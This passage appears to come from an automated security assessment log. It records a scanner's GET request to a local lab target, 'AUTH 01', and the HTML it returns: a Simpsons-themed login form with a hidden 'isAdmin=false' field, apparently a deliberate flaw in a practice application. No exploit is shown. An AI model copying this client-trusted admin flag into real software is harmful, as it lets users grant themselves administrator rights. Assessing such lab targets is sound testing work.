        <button type="submit">Login</button>
    </form>
    </body>
</html>
```

- Evidence `ev-mqynqm3x-1a` — `artifacts/_/ev-mqynqm3x-1a/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3169
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:27:53 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 01</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="hidden" name="isAdmin" value="false" />
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```
